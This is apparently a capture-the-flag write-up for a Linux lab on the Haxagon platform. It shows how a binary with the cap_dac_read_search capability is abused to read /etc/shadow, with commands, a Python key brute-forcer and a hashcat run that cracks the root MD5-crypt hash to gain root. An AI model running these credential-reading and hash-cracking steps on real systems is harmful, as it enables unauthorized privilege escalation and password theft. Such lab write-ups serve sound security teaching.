---
title: No Sudo
date: 2026-10-09
category: Haxagon
summary: Abuse the Linux capability cap_dac_read_search on a custom binary to read /etc/shadow and crack the root hash.
featured: true
---

## Challenge

- **Platform:** Haxagon Battlefield
- **Type:** Linux Priv. Esc. / Reverse Engineering / Password Cracking
- **Target:** create file `flag` in `/root`
- **Constraints:** no `sudo` access, no SUID binary

## 1. Enumeration

Check the current user's permissions:

```bash
student@eaf464cc5352:~$ id
uid=1000(student) gid=1000(student) groups=1000(student)
```

Check `sudo`:

```bash
sudo -l
# Result: student is not in the sudoers file.
```

`sudo` is blocked, so I scanned the Linux capabilities on the system:

```bash
getcap -r / 2>/dev/null
```

Result:

```
/usr/bin/readfile cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```

**The weakness:** the custom binary `/usr/bin/readfile` has the capability `cap_dac_read_search=ep`, which lets the program bypass all of Linux's read-permission checks — meaning it can read any file on the system, including `/etc/shadow` or files inside `/root`.

## 2. Reverse engineering /usr/bin/readfile

```bash
student@eaf464cc5352:~$ /usr/bin/readfile /etc/passwd
Usage: /usr/bin/readfile <file> <secret_key>
```

The binary takes two parameters: the file to read and a secret key.

Use `objdump` to read `.rodata` and find the fixed strings:

```bash
objdump -s -j .rodata /usr/bin/readfile
```

The string fragments turn out to be scattered. The fixed strings are: `go`, `t8s`, `oJHu`, `NzTH`, `JTDDAfq`.

The program joins these 5 fragments with `%s%s%s%s%s` via `snprintf`. Since the order in which they are loaded onto the registers/stack may differ, write a Python script to try all 5! = 120 permutations right on the target:

```python
import itertools, subprocess

parts = ["go", "t8s", "oJHu", "NzTH", "JTDDAfq"]
for p in itertools.permutations(parts):
    key = "".join(p)
    out = subprocess.getoutput(f"/usr/bin/readfile /etc/passwd {key}")
    if "Access Denied" not in out and "Usage:" not in out:
        print(f"\n[+] KEY FOUND: {key}\n")
        break
```

Key found: `oJHut8sgoJTDDAfqNzTH`

## 3. Read the file and retrieve the password

```bash
/usr/bin/readfile /etc/shadow oJHut8sgoJTDDAfqNzTH
```

Output:

```
root:$1.../:20206:0:99999:7:::
...
```

We got the hash `$1.../` — it is MD5 crypt.

## 4. Crack the hash

Then I cracked the hash with hashcat:

- Hash type (`-m`): `500` (md5crypt)
- Attack mode (`-a`): `0` (wordlist)
- Wordlist: `rockyou.txt`

```bash
hashcat -m 500 -a 0 --username hash.txt rockyou.txt
```

After cracking, we got the password.

## 5. Privilege escalation

```bash
student@eaf464cc5352:~$ su root
Password: <PASSWD>
root@eaf464cc5352:~# whoami
root
```

I'm in :) — now we just need to create the flag file at `/root/flag`:

```bash
touch /root/flag
```

## Takeaways

1. **Linux capabilities:** granting `cap_dac_read_search` to a custom binary without tight controls turns it into an arbitrary-file-read tool.
2. **Failed obfuscation:** splitting the secret string in the source and reassembling it at runtime does not stop static analysis (reading `.rodata`) or brute-forcing the permutations.
3. **Weak hashing algorithm:** MD5-crypt (`$1$`) is cracked quickly with a modern GPU.
